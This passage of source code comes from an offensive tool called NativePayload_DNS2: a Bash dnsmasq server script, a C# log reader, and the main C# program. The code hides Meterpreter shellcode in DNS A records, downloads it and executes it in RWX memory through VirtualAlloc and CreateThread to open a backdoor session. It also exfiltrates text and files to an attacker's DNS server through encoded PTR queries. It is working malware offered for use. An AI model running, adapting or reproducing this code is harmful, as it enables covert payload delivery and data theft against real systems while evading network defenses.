\"[!] Your IPv4 is : \" \"${octets::-1}\".$SubnetHostIDcounter\n\r\n\r                                echo \"${octets::-1}\".$SubnetHostIDcounter $4 &gt;&gt; DnsHost.txt\n\r\n\r                                tput setaf 9;\n\r\n\r                                octets=\"\"\n\r\n\r                                c=0\n\r\n\r                                ((SubnetHostIDcounter++))                                \n\r\n\r                                else\n\r\n\r                                tput setaf 9;\n\r\n\r                                fi\n\r\n\r   \n\r\n\r                        if((SubnetHostIDcounter == 256))\n\r\n\r                        then\n\r\n\r                        echo \"[!] Oops Your IPv4 HostID was upper than 255 : \" \"${octets::-1}\".$SubnetHostIDcounter\n\r\n\r                        break\n\r\n\r                        fi\n\r\n\r                        done\n\r\n\r                        echo\n\r\n\r                        tput setaf 2;\n\r\n\r                        echo \"[!] DnsHost.txt Created by\" $SubnetHostIDcounter \"A Records for Domain:\" $4 \n\r\n\r                        echo \"[!] you can use this DNSHOST.TXT file via Dnsmasq tool\"\n\r\n\r                        tput setaf 2;\n\r\n\r                        echo \"[!] to dump these A records you should use this syntax in client side:\"\n\r\n\r                        tput setaf 9;\n\r\n\r                        echo \"[!] Syntax : NativePayload_DNS2.sh -d getdata domain_name DnsMasq_IPv4\"\n\r\n\r                        echo\n\r\n\r                        echo \"[&gt;] DNSMASQ Satarted by DNSHOST.TXT File\"\n\r\n\r                        echo\n\r\n\r                        tput setaf 9;\n\r\n\r                        `dnsmasq --no-hosts --no-daemon --log-queries -H DnsHost.txt`\n\r\n\r                        tput setaf 9;\n\r\n\r \n\r\n\r \n\r\n\r        fi\n\r\n\r \n\r\n\r        fi        \n\r\n\r \n\r\n\r        # make DNS Server for Dump DATA via DNS PTR Queries (Server Side \"A\")\n\r\n\r        # Reading Mode (log data via dnsmasq log files)\n\r\n\r        if [ $1 == \"-r\" ] \n\r\n\r        then\n\r\n\r        tput setaf 9;\n\r\n\r        echo \"[&gt;] Reading Mode , DNSMASQ Started by this log file : /var/log/dnsmasq.log !\" \n\r\n\r        tput setaf 2;\n\r\n\r        echo \"\" &gt; /var/log/dnsmasq.log                \n\r\n\r        `dnsmasq --no-hosts --no-daemon --log-queries --log-facility=/var/log/dnsmasq.log` &amp;        \n\r\n\r        filename=\"/var/log/dnsmasq.log\"\n\r\n\r        m1=$(md5sum \"$filename\")\n\r\n\r        fs=$(stat -c%s \"$filename\")\n\r\n\r        count=0\n\r\n\r        while true; do\n\r\n\r                tput setaf 2;                \n\r\n\r                sleep 10\n\r\n\r                fs2=$(stat -c%s \"$filename\")\n\r\n\r                if [ \"$fs\" != \"$fs2\" ] ; \n\r\n\r                then\n\r\n\r  \n\r\n\r                tput setaf 6;\n\r\n\r                echo \"[!] /var/log/dnsmasq.log File has changed!\"                 \n\r\n\r                echo \"[!] Checking Queries\"\n\r\n\r                fs=$(stat -c%s \"$filename\")\n\r\n\r                fs2=$(stat -c%s \"$filename\")\n\r\n\r                PTRecords=`cat $filename | grep PTR  | awk {\'print $6\'}`                 \n\r\n\r                echo \"[!] Dump this Text via PTR Queries\"\n\r\n\r                tput setaf 2;\n\r\n\r                for ops1 in `echo $PTRecords`; do\n\r\n\r                ((count++))\n\r\n\r                                myrecords=`echo $ops1 | cut -d\'i\' -f1`\n\r\n\r  \n\r\n\r                mydec1=`echo \"${myrecords::-1}\" | cut -d\'.\' -f4`\n\r\n\r                mydec2=`echo \"${myrecords::-1}\" | cut -d\'.\' -f3`\n\r\n\r                mydec3=`echo \"${myrecords::-1}\" | cut -d\'.\' -f2`\n\r\n\r                mydec4=`echo \"${myrecords::-1}\" | cut -d\'.\' -f1`\n\r\n\r \n\r\n\r                tput setaf 9;\n\r\n\r                if (($count == 25))\n\r\n\r                then\n\r\n\r                echo \n\r\n\r                count=0\n\r\n\r                else\n\r\n\r                printf \'%x\'  `echo $mydec1 $mydec2 $mydec3 $mydec4` | xxd -r -p \n\r\n\r                tput setaf 2\n\r\n\r                fi            \n\r\n\r                mydec=\"\"                \n\r\n\r                done \n\r\n\r                else\n\r\n\r                fs=$(stat -c%s \"$filename\")\n\r\n\r                fs2=$(stat -c%s \"$filename\")\n\r\n\r                fi\n\r\n\r        done\n\r\n\r        fi\n\r\n\r\n\r\n\r \n\r\n\rLogReader C# Source Code :\n\r\n\r \n\r\n\rusing System;\n\r\n\rusing System.Collections.Generic;\n\r\n\rusing System.Text;\n\r\n\r\n\r\n\rnamespace LogReader\n\r\n\r{\n\r\n\r    class Program\n\r\n\r    {\n\r\n\r        static void Main(string[] args)\n\r\n\r        {                   \n\r\n\r            Console.ForegroundColor = ConsoleColor.DarkGray;\n\r\n\r            Console.WriteLine();\n\r\n\r            Console.WriteLine(\"NativePayload_DNS2 , Ver 2.0 \\\"Dnsmasq\\\" Log Reader\");\n\r\n\r            Console.WriteLine(\"Reading Dnsmasq Log for Dumping Exfiltrated DATA by DNS Traffic (PTR Records)\");\n\r\n\r            Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r            Console.WriteLine(\"Published by Damon Mohammadbagher Oct 2017\");\n\r\n\r            Console.WriteLine();\n\r\n\r            Console.ForegroundColor = ConsoleColor.DarkCyan;\n\r\n\r            Console.WriteLine(\"Syntax I : LogReader.exe \\\"Dnsmasq_log.txt\\\" Octet Mode 3 or 4 \\\"DNSServer_IPAddress\\\" \");\n\r\n\r            Console.ForegroundColor = ConsoleColor.Cyan;\n\r\n\r            Console.WriteLine(\"Syntax II: LogReader.exe \\\"Dnsmasq_log.txt\\\" Octet Mode 3 or 4 \\\"DNSServer_IPAddress\\\" DEBUG \");\n\r\n\r            Console.WriteLine();\n\r\n\r            Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r            string[] TextFile = System.IO.File.ReadAllLines(args[0]);\n\r\n\r            string DNSServer = args[2];\n\r\n\r            string[] DNSAddress = DNSServer.Split(\'.\');\n\r\n\r            string DNS_Address_Reverse_Sort;\n\r\n\r            DNS_Address_Reverse_Sort = DNSAddress[3] + \".\" + DNSAddress[2] + \".\" + DNSAddress[1] + \".\" + DNSAddress[0];\n\r\n\r            bool Is_4_Octets_Mode = false;\n\r\n\r            if (args.Length &gt; 2)\n\r\n\r            {\n\r\n\r                if (args[1] == \"3\") Is_4_Octets_Mode = false;\n\r\n\r                if (args[1] == \"4\") Is_4_Octets_Mode = true;\n\r\n\r            }\n\r\n\r            List&lt;byte&gt; Records = new List&lt;byte&gt;();\n\r\n\r \n\r\n\r            try\n\r\n\r            {\n\r\n\r \n\r\n\r                if (args.Length == 4)\n\r\n\r                {\n\r\n\r                    if (args[3].ToUpper() == \"DEBUG\")\n\r\n\r                    {\n\r\n\r                        Console.ForegroundColor = ConsoleColor.Yellow;\n\r\n\r                        Console.WriteLine(\"[!] Debug Mode\");\n\r\n\r                        Console.WriteLine();\n\r\n\r                        Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                        Console.WriteLine(\"|PTR Record| \\t\\t\\t |DEBUG| \\t |Exfiltrated Text/DATA|\");\n\r\n\r                        Console.WriteLine();\n\r\n\r                    }\n\r\n\r                }\n\r\n\r               \n\r\n\r                byte[] debug = new byte[4];\n\r\n\r                foreach (string item in TextFile)\n\r\n\r                {\n\r\n\r                    if (item.Contains(\".\") &amp;&amp; item.ToUpper().Contains(\"IN-ADDR.ARPA\"))\n\r\n\r                    {\n\r\n\r                        if (!item.Contains(DNS_Address_Reverse_Sort))\n\r\n\r                        {\n\r\n\r \n\r\n\r                            if (Is_4_Octets_Mode)\n\r\n\r                            {\n\r\n\r                                string[] tmp = item.Split(\'.\');\n\r\n\r \n\r\n\r                                Records.Add(Convert.ToByte(tmp[3]));\n\r\n\r                                Records.Add(Convert.ToByte(tmp[2]));\n\r\n\r                                Records.Add(Convert.ToByte(tmp[1]));\n\r\n\r                                Records.Add(Convert.ToByte(tmp[0]));\n\r\n\r                              \n\r\n\r                                debug[0] = Convert.ToByte(tmp[3]);\n\r\n\r                                debug[1] = Convert.ToByte(tmp[2]);\n\r\n\r                                debug[2] = Convert.ToByte(tmp[1]);\n\r\n\r                                debug[3] = Convert.ToByte(tmp[0]);\n\r\n\r \n\r\n\r                            }\n\r\n\r                            if (!Is_4_Octets_Mode)\n\r\n\r                            {\n\r\n\r                                string[] tmp = item.Split(\'.\');\n\r\n\r \n\r\n\r                                Records.Add(Convert.ToByte(tmp[3]));\n\r\n\r                                Records.Add(Convert.ToByte(tmp[2]));\n\r\n\r                                Records.Add(Convert.ToByte(tmp[1]));\n\r\n\r \n\r\n\r                                debug[0] = Convert.ToByte(tmp[3]);\n\r\n\r                                debug[1] = Convert.ToByte(tmp[2]);\n\r\n\r                                debug[2] = Convert.ToByte(tmp[1]);\n\r\n\r\n\r\n\r                            }\n\r\n\r                            \n\r\n\r \n\r\n\r                            try\n\r\n\r                            {\n\r\n\r                                if (args.Length == 4)\n\r\n\r                                {\n\r\n\r                                    if (args[3].ToUpper() == \"DEBUG\")\n\r\n\r                                    {\n\r\n\r                                        Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                                        Console.Write(item);\n\r\n\r                                        Console.ForegroundColor = ConsoleColor.DarkYellow;\n\r\n\r                                        Console.Write(\"     === Debug ==&gt;     \");\n\r\n\r                                        Console.ForegroundColor = ConsoleColor.Green;\n\r\n\r                                        Console.WriteLine(UTF8Encoding.ASCII.GetString(debug));\n\r\n\r                                        Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                                    }\n\r\n\r                                }\n\r\n\r                            }\n\r\n\r                            catch (Exception omg)\n\r\n\r                            {\n\r\n\r                                Console.WriteLine(\"error 1 : \"+omg.Message);\n\r\n\r                            }\n\r\n\r \n\r\n\r                        }\n\r\n\r                    }\n\r\n\r                }\n\r\n\r \n\r\n\r                byte[] Final_Exf_Text = new byte[Records.Count];\n\r\n\r \n\r\n\r                for (int j = 0; j &lt; Final_Exf_Text.Length; j++)\n\r\n\r                {\n\r\n\r                    string s = string.Format(\"{0:x2}\", (Int32)Convert.ToInt32(Records[j].ToString()));\n\r\n\r                    /// Debug\n\r\n\r                    // Console.WriteLine(s);\n\r\n\r                    Final_Exf_Text[j] = Convert.ToByte(s, 16);\n\r\n\r                }\n\r\n\r \n\r\n\r                Console.WriteLine();\n\r\n\r                Console.ForegroundColor = ConsoleColor.DarkGreen;\n\r\n\r                Console.Write(\"[!] Dumping this Text from Dnsmasq Log File \\\"{0}\\\" : \",args[0]);\n\r\n\r                Console.WriteLine();\n\r\n\r                Console.ForegroundColor = ConsoleColor.Green;\n\r\n\r                Console.WriteLine(UTF8Encoding.ASCII.GetChars(Final_Exf_Text));\n\r\n\r                Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r            }\n\r\n\r            catch (Exception e)\n\r\n\r            {\n\r\n\r                Console.WriteLine(e.Message);\n\r\n\r            }\n\r\n\r        }\n\r\n\r    }\n\r\n\r}\n\r\n\r \n\r\n\rNativePayload_DNS2 , C# Source Code  (version 2.0):\n\r\n\rSupporting .NET 2.0 , 3.0 , 3.5 , 4.0  (Only)\n\r\n\r \n\r\n\rusing System;\n\r\n\rusing System.Collections.Generic;\n\r\n\rusing System.Diagnostics;\n\r\n\rusing System.Linq;\n\r\n\rusing System.Runtime.InteropServices;\n\r\n\rusing System.Text;\n\r\n\r \n\r\n\rnamespace NativePayload_DNS2\n\r\n\r{\n\r\n\r    class Program\n\r\n\r    {\n\r\n\r        public static bool Is_4_OctetsMode = false;\n\r\n\r \n\r\n\r        static void Main(string[] args)\n\r\n\r        {\n\r\n\r            \n\r\n\r            Console.ForegroundColor = ConsoleColor.DarkGray;\n\r\n\r            Console.WriteLine();\n\r\n\r            Console.WriteLine(\"NativePayload_DNS2 , Ver 2.0\");\n\r\n\r            Console.WriteLine(\"Backdoor Payload Downloading by DNS Traffic (A Records)\");\n\r\n\r           \n\r\n\r            Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r            Console.WriteLine(\"Published by Damon Mohammadbagher Sep-Oct 2017\");\n\r\n\r            if (args[0].ToUpper() == \"HELP\")\n\r\n\r            {\n\r\n\r                Console.ForegroundColor = ConsoleColor.DarkYellow;\n\r\n\r                Console.WriteLine();\n\r\n\r                Console.WriteLine(\"[!] NativePayload_DNS2 , Backdoor Payload Transferring by DNS Traffic (A Records)\");                \n\r\n\r                Console.ForegroundColor = ConsoleColor.DarkCyan;\n\r\n\r                Console.WriteLine(\"[!] Syntax 1: Creating Meterperter Payload for Transferring by DNS A records\");\n\r\n\r                Console.ForegroundColor = ConsoleColor.Cyan;\n\r\n\r                Console.WriteLine(\"[!] Syntax 1: NativePayload_DNS2.exe \\\"Create\\\" \\\"DomainName\\\" \\\"[Meterpreter Payload]\\\"  \");\n\r\n\r                Console.WriteLine(\"[!] Example1: NativePayload_DNS2.exe Create MICROSOFT.COM \\\"fc,48,83,e4,f0,e8\\\"  \");\n\r\n\r                Console.WriteLine();\n\r\n\r                Console.ForegroundColor = ConsoleColor.DarkCyan;\n\r\n\r                Console.WriteLine(\"[!] Syntax 2: Getting Meterpeter SESSION via DNS A records\");\n\r\n\r                Console.ForegroundColor = ConsoleColor.Cyan;\n\r\n\r                Console.WriteLine(\"[!] Syntax 2: NativePayload_DNS2.exe \\\"Session\\\" \\\"DomainName\\\" FakeDNSServer  \");\n\r\n\r                Console.WriteLine(\"[!] Example2: NativePayload_DNS2.exe Session MICROSOFT.COM 192.168.56.1  \");\n\r\n\r                Console.WriteLine();\n\r\n\r                Console.ForegroundColor = ConsoleColor.DarkCyan;\n\r\n\r                Console.WriteLine(\"[!] Syntax 3: Creating Text DATA for Transferring by DNS A records\");\n\r\n\r                Console.ForegroundColor = ConsoleColor.Cyan;\n\r\n\r                Console.WriteLine(\"[!] Syntax 3: NativePayload_DNS2.exe \\\"TextFile\\\" \\\"DomainName\\\" \\\"[Text Data]\\\"  \");\n\r\n\r                Console.WriteLine(\"[!] Example3-1: NativePayload_DNS2.exe TextFile \\\"MICROSOFT.COM\\\" \\\"This is Test\\\"  \");\n\r\n\r                Console.WriteLine(\"[!] Example3-2: NativePayload_DNS2.exe TextFile \\\"MICROSOFT.COM\\\" -f MytxtFile.txt  \");\n\r\n\r                Console.WriteLine();\n\r\n\r                Console.ForegroundColor = ConsoleColor.DarkCyan;\n\r\n\r                Console.WriteLine(\"[!] Syntax 4: Getting Text DATA via DNS A records\");\n\r\n\r                Console.ForegroundColor = ConsoleColor.Cyan;\n\r\n\r                Console.WriteLine(\"[!] Syntax 4: NativePayload_DNS2.exe \\\"Getdata\\\" \\\"DomainName\\\" FakeDNSServer  \");\n\r\n\r                Console.WriteLine(\"[!] Example4: NativePayload_DNS2.exe Getdata \\\"MICROSOFT.COM\\\" 192.168.56.1  \");\n\r\n\r                Console.ForegroundColor = ConsoleColor.DarkYellow;\n\r\n\r                Console.WriteLine();\n\r\n\r                Console.WriteLine(\"[!] DATA Exfiltration/Uploading by DNS Traffic (PTR Records)\");\n\r\n\r                Console.ForegroundColor = ConsoleColor.DarkCyan;                \n\r\n\r                Console.WriteLine(\"[!] Syntax 5: Exfiltration / Uploading Text DATA via DNS PTR records\");\n\r\n\r                Console.ForegroundColor = ConsoleColor.Cyan;\n\r\n\r                Console.WriteLine(\"[!] Syntax 5: NativePayload_DNS2.exe \\\"Exf\\\" \\\"OctetMode 3 or 4\\\" Min.Max Delay \\\"Text\\\" FakeDNSServer  \");\n\r\n\r                Console.WriteLine(\"[!] Example5: NativePayload_DNS2.exe Exf 3 2.5 \\\"any text you want\\\" 192.168.56.1  \");\n\r\n\r                Console.WriteLine(\"[!] Example5: NativePayload_DNS2.exe Exf 4 1.6 \\\"any text you want\\\" 192.168.56.1  \");\n\r\n\r                Console.WriteLine();\n\r\n\r                Console.ForegroundColor = ConsoleColor.DarkCyan;\n\r\n\r                Console.WriteLine(\"[!] Syntax 6: Exfiltration / Uploading Text-File DATA via DNS PTR records\");\n\r\n\r                Console.ForegroundColor = ConsoleColor.Cyan;\n\r\n\r                Console.WriteLine(\"[!] Syntax 6: NativePayload_DNS2.exe \\\"Exfile\\\" \\\"OctetMode 3 or 4\\\" Min.Max Delay \\\"Text-file.txt\\\" FakeDNSServer  \");\n\r\n\r                Console.WriteLine(\"[!] Example6: NativePayload_DNS2.exe Exfile 3 2.3 \\\"test.txt\\\" 192.168.56.1  \");\n\r\n\r                Console.WriteLine(\"[!] Example6: NativePayload_DNS2.exe Exfile 4 1.12 \\\"test.txt\\\" 192.168.56.1  \");\n\r\n\r \n\r\n\r                Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r            }\n\r\n\r            if (args[0].ToUpper() == \"TEXTFILE\")\n\r\n\r            {\n\r\n\r                \n\r\n\r                string StartAddress = \"0\";\n\r\n\r                string DomainName = args[1];\n\r\n\r                string Payload = \"\";\n\r\n\r                if (args[2].ToUpper() == \"-F\")\n\r\n\r                {\n\r\n\r                    Payload = System.IO.File.ReadAllText(args[3]);\n\r\n\r                }\n\r\n\r                else\n\r\n\r                {\n\r\n\r                    Payload = args[2];                    \n\r\n\r                }\n\r\n\r                string Temp_Hex = \"\";                \n\r\n\r                int CheckLength = Payload.Length % 3;\n\r\n\r                \n\r\n\r \n\r\n\r               if (Payload.Length &gt; (3 * 255) || CheckLength!=0)\n\r\n\r                {\n\r\n\r                    if (Payload.Length &gt; (3 * 255))\n\r\n\r                    {\n\r\n\r                        Console.ForegroundColor = ConsoleColor.Red;\n\r\n\r                        Console.WriteLine();\n\r\n\r                        Console.WriteLine(\"[x] WOow woOw Wait , Y is your payload counter in IPv4 Address X.X.X.Y\");\n\r\n\r                        Console.WriteLine(\"[x] So your Payload \\\"X.X.X\\\" for each A Records with same Domain Name should not have Length \\\"Y\\\" more than 255 ;)\");\n\r\n\r                        Console.WriteLine(\"[x] It means your Y * 3 should not more than 255 * 3 = 765 so your Payload Length should not more than 765 ;)\");\n\r\n\r                        Console.WriteLine(\"[x] Your payload length is {0}\", Payload.Length.ToString());\n\r\n\r                        Console.WriteLine(\"[x] Information : X.X.X.Y ==&gt; 11.22.33.1 .... 11.22.33.255\");\n\r\n\r                        Console.WriteLine(\"[x] Information : in my code , 3 first octets are your payload and only last octet is your Counter for Payload Length\");\n\r\n\r                        Console.WriteLine(\"[x] Information : so you can not have Payload with more than 255 * 3 length \");\n\r\n\r                        Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                    }\n\r\n\r                    if(CheckLength != 0)\n\r\n\r                    {\n\r\n\r                        Console.ForegroundColor = ConsoleColor.DarkYellow;\n\r\n\r                        Console.WriteLine();\n\r\n\r                        Console.WriteLine(\"[x] Your payload length % 3 should be 0\");\n\r\n\r                        Console.WriteLine(\"[x] Your payload length is {0}\", Payload.Length.ToString());\n\r\n\r                        Console.ForegroundColor = ConsoleColor.Red;\n\r\n\r                        Console.WriteLine(\"[x] Your payload length % 3 = {0}\", CheckLength.ToString());\n\r\n\r                        Console.WriteLine(\"[x] For fixing you should Remove/Add one or two strings to your payload ;)\");\n\r\n\r                        Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                    }\n\r\n\r                }\n\r\n\r                else\n\r\n\r                {\n\r\n\r                    foreach (char P in Payload)\n\r\n\r                    {\n\r\n\r                        int tmp = P;\n\r\n\r                        Temp_Hex += string.Format(\"{0:x2}\", (Int32)Convert.ToInt32(tmp.ToString())) + \",\";\n\r\n\r                    }\n\r\n\r \n\r\n\r                    SortIPAddress(Temp_Hex, StartAddress, DomainName,false);\n\r\n\r                }\n\r\n\r              \n\r\n\r            }\n\r\n\r \n\r\n\r            if (args[0].ToUpper() == \"CREATE\")\n\r\n\r            {\n\r\n\r                string StartAddress = \"0\";\n\r\n\r                string DomainName = args[1];\n\r\n\r                string Payload = args[2];\n\r\n\r                int Checkit = (Payload.Split(\',\').Length) % 3;\n\r\n\r                if (Checkit != 0)\n\r\n\r                {\n\r\n\r                    Console.ForegroundColor = ConsoleColor.DarkYellow;\n\r\n\r                    Console.WriteLine();\n\r\n\r                    Console.WriteLine(\"[x] Your payload length % 3 should be 0\");\n\r\n\r                    Console.WriteLine(\"[x] Your payload length is {0}\", Payload.Split(\',\').Length.ToString());\n\r\n\r                    Console.ForegroundColor = ConsoleColor.Red;\n\r\n\r                    Console.WriteLine(\"[x] Your payload length % 3 = {0}\", Checkit.ToString());\n\r\n\r                    if (Checkit == 2) Console.WriteLine(\"[x] For fixing you should Add \\\",00\\\" to your payload ;)\");\n\r\n\r                    if (Checkit == 1) Console.WriteLine(\"[x] For fixing you should Add \\\",00,00\\\" to your payload ;)\");\n\r\n\r                    Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                }\n\r\n\r                else\n\r\n\r                {\n\r\n\r                    SortIPAddress(Payload, StartAddress, DomainName,false);\n\r\n\r                }\n\r\n\r            }\n\r\n\r            if (args[0].ToUpper() == \"SESSION\")\n\r\n\r            {\n\r\n\r \n\r\n\r                byte[] _Exfiltration_DATA_Bytes_A_Records;\n\r\n\r                _Exfiltration_DATA_Bytes_A_Records = __nslookup(args[1], args[2]);\n\r\n\r \n\r\n\r                Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                Console.WriteLine();\n\r\n\r                Console.WriteLine(\"Bingo Meterpreter session by DNS traffic (A Records) ;)\");\n\r\n\r                UInt32 funcAddr = VirtualAlloc(0, (UInt32)_Exfiltration_DATA_Bytes_A_Records.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\r\n\r                Marshal.Copy(_Exfiltration_DATA_Bytes_A_Records, 0, (IntPtr)(funcAddr), _Exfiltration_DATA_Bytes_A_Records.Length);\n\r\n\r                IntPtr hThread = IntPtr.Zero;\n\r\n\r                UInt32 threadId = 0;\n\r\n\r                IntPtr pinfo = IntPtr.Zero;\n\r\n\r \n\r\n\r                hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);\n\r\n\r                WaitForSingleObject(hThread, 0xFFFFFFFF);\n\r\n\r \n\r\n\r            }\n\r\n\r            if (args[0].ToUpper() == \"GETDATA\")\n\r\n\r            {\n\r\n\r                byte[] _Exfiltration_DATA_Bytes_A_Records;\n\r\n\r                _Exfiltration_DATA_Bytes_A_Records = __nslookup(args[1], args[2]);\n\r\n\r \n\r\n\r                Console.ForegroundColor = ConsoleColor.Green;\n\r\n\r                Console.WriteLine();\n\r\n\r                Console.Write(\"[&gt;] Transferred Payload/Text Data is : \");\n\r\n\r                Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                Console.Write(UTF8Encoding.UTF8.GetChars(_Exfiltration_DATA_Bytes_A_Records));                \n\r\n\r                Console.WriteLine();\n\r\n\r            }\n\r\n\r            if (args[0].ToUpper() == \"EXF\")\n\r\n\r            {\n\r\n\r                if (args.Length &gt; 2)\n\r\n\r                {\n\r\n\r                    if (args[1] == \"4\")\n\r\n\r                    {\n\r\n\r                        /// exfiltration by Text/String \n\r\n\r                        /// octets Mode 4\n\r\n\r                        Is_4_OctetsMode = true;\n\r\n\r                        __nslookup(args[3], args[4], true, Convert.ToInt32(args[2].Split(\'.\')[0] + \"000\"), Convert.ToInt32(args[2].Split(\'.\')[1] + \"000\"));\n\r\n\r                    }\n\r\n\r                    if (args[1] == \"3\")\n\r\n\r                    {\n\r\n\r                        /// exfiltration by Text/String \n\r\n\r                        /// octets Mode 3\n\r\n\r                        Is_4_OctetsMode = false;\n\r\n\r                        __nslookup(args[3], args[4], true, Convert.ToInt32(args[2].Split(\'.\')[0] + \"000\"), Convert.ToInt32(args[2].Split(\'.\')[1] + \"000\"));\n\r\n\r                    }\n\r\n\r                }\n\r\n\r \n\r\n\r            }\n\r\n\r            if (args[0].ToUpper() == \"EXFILE\")\n\r\n\r            {\n\r\n\r                if (args.Length &gt; 2)\n\r\n\r                {\n\r\n\r \n\r\n\r                    if (args[1] == \"4\")\n\r\n\r                    {\n\r\n\r                        /// exfiltration by Text File                 \n\r\n\r                        /// octets Mode 4\n\r\n\r                        Is_4_OctetsMode = true;\n\r\n\r                        string TextFile = System.IO.File.ReadAllText(args[3]);\n\r\n\r                        __nslookup(TextFile, args[4], true, Convert.ToInt32(args[2].Split(\'.\')[0] + \"000\"), Convert.ToInt32(args[2].Split(\'.\')[1] + \"000\"));\n\r\n\r                    }\n\r\n\r                    if (args[1] == \"3\")\n\r\n\r                    {\n\r\n\r                        /// exfiltration by Text File\n\r\n\r                        /// octets Mode 3                 \n\r\n\r                        Is_4_OctetsMode = false;\n\r\n\r                        string TextFile = System.IO.File.ReadAllText(args[3]);\n\r\n\r                        __nslookup(TextFile, args[4], true, Convert.ToInt32(args[2].Split(\'.\')[0] + \"000\"), Convert.ToInt32(args[2].Split(\'.\')[1] + \"000\"));\n\r\n\r                    }\n\r\n\r                }\n\r\n\r \n\r\n\r            }\n\r\n\r \n\r\n\r        }\n\r\n\r \n\r\n\r        public static string SortIPAddress(string _Payload,string MainIP, string String_DomainName,bool Is_exfiltration_Mode)\n\r\n\r        {\n\r\n\r            string[] X = _Payload.Split(\',\');\n\r\n\r            string[] XX = new string[X.Length / 3];\n\r\n\r            int counter = 0;\n\r\n\r            int X_counter = 0;\n\r\n\r            string tmp = \"\";\n\r\n\r            Console.WriteLine();\n\r\n\r            for (int i = 0; i &lt; X.Length;)\n\r\n\r            {\n\r\n\r \n\r\n\r                tmp += X[i]+\",\";\n\r\n\r                i++;\n\r\n\r                counter++;\n\r\n\r                if (counter &gt;= 3)\n\r\n\r                {\n\r\n\r                    counter = 0;\n\r\n\r                    XX[X_counter] = tmp.Substring(0,tmp.Length-1);\n\r\n\r                    X_counter++;\n\r\n\r                    tmp = \"\";\n\r\n\r                }\n\r\n\r            }\n\r\n\r \n\r\n\r            string[] IP_Octets = new string[3];\n\r\n\r            string nique = \"\";\n\r\n\r            string Final_DNS_Text_File = \"\";\n\r\n\r            int Display_counter = 0;\n\r\n\r            int First_Octet = 0;\n\r\n\r            foreach (var item in XX)\n\r\n\r            {\n\r\n\r                /// First_Octet++; it means my counter for IPAddress will start by address W.X.Y.1 ...\n\r\n\r                First_Octet++;\n\r\n\r                IP_Octets = item.Split(\',\');\n\r\n\r                if (Display_counter &lt; 4)\n\r\n\r                    Console.Write(item.ToString() + \" ====&gt;  \");\n\r\n\r                foreach (string itemS in IP_Octets)\n\r\n\r                {                    \n\r\n\r                    int Tech = Int32.Parse(itemS, System.Globalization.NumberStyles.HexNumber);\n\r\n\r                    nique += (Tech.ToString() + \".\");\n\r\n\r                }\n\r\n\r                if (Display_counter &lt; 4)\n\r\n\r                    Console.WriteLine(nique.Substring(0, nique.Length - 1) + \".\" + (First_Octet + Int32.Parse(MainIP)).ToString());\n\r\n\r                Final_DNS_Text_File += nique.Substring(0, nique.Length - 1) + \".\" + (First_Octet + Int32.Parse(MainIP)).ToString() + \" \" + String_DomainName + \" \\r\\n\";\n\r\n\r                nique = \"\";\n\r\n\r                Display_counter++;\n\r\n\r                if (First_Octet == 255) First_Octet = 0;\n\r\n\r            }\n\r\n\r            Console.WriteLine();\n\r\n\r            if (!Is_exfiltration_Mode)\n\r\n\r            {\n\r\n\r                Console.ForegroundColor = ConsoleColor.Red;\n\r\n\r                Console.WriteLine(\"Copy these A Records to /etc/hosts or DNS.TXT for Using by Dnsmasq tool\");\n\r\n\r                Console.WriteLine();\n\r\n\r                Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                Console.WriteLine(Final_DNS_Text_File);\n\r\n\r            }\n\r\n\r            if (Is_exfiltration_Mode)\n\r\n\r            {              \n\r\n\r                return Final_DNS_Text_File;\n\r\n\r            }\n\r\n\r            return Final_DNS_Text_File;\n\r\n\r        }\n\r\n\r        /// &lt;summary&gt;\n\r\n\r        /// Ver 2.0 \n\r\n\r        /// reversing this Technique by PTR Records for exfiltration (Uploading) DATA to DNS server\n\r\n\r        /// Adding Exfiltration Feature for Uploading DATA by DNS PTR Records to Attacker DNS Server \n\r\n\r        /// in this case for reading these Exfiltrated String/DATA , you need to read DNSMASQ Log-file by switch ReadLog\n\r\n\r        /// Begin\n\r\n\r        /// &lt;/summary&gt;\n\r\n\r        public static string SortIPAddress(string _Payload, string String_DomainName, bool Is_exfiltration_Mode , bool Is_4_Octets)\n\r\n\r        {\n\r\n\r            string Final_DNS_Text_File = \"\";\n\r\n\r            if (Is_4_Octets)\n\r\n\r            {\n\r\n\r                string[] X = _Payload.Split(\',\');\n\r\n\r                string[] XX = new string[X.Length / 4];\n\r\n\r                int counter = 0;\n\r\n\r                int X_counter = 0;\n\r\n\r                string tmp = \"\";\n\r\n\r                Console.WriteLine();\n\r\n\r                for (int i = 0; i &lt; X.Length;)\n\r\n\r                {\n\r\n\r \n\r\n\r                    tmp += X[i] + \",\";\n\r\n\r                    i++;\n\r\n\r                    counter++;\n\r\n\r                    if (counter &gt;= 4)\n\r\n\r                    {\n\r\n\r                        counter = 0;\n\r\n\r                        XX[X_counter] = tmp.Substring(0, tmp.Length - 1);\n\r\n\r                        X_counter++;\n\r\n\r                        tmp = \"\";\n\r\n\r                    }\n\r\n\r                }\n\r\n\r \n\r\n\r                string[] IP_Octets = new string[4];\n\r\n\r                string nique = \"\";\n\r\n\r                Final_DNS_Text_File = \"\";\n\r\n\r                int Display_counter = 0;\n\r\n\r                \n\r\n\r                foreach (var item in XX)\n\r\n\r                {\n\r\n\r                    \n\r\n\r                    IP_Octets = item.Split(\',\');\n\r\n\r                    if (Display_counter &lt; 4)\n\r\n\r                        Console.Write(item.ToString() + \" ====&gt;  \");\n\r\n\r                    foreach (string itemS in IP_Octets)\n\r\n\r                    {\n\r\n\r                        int Tech = Int32.Parse(itemS, System.Globalization.NumberStyles.HexNumber);\n\r\n\r                        nique += (Tech.ToString() + \".\");\n\r\n\r                    }\n\r\n\r                    if (Display_counter &lt; 4)\n\r\n\r                        Console.WriteLine(nique.Substring(0, nique.Length - 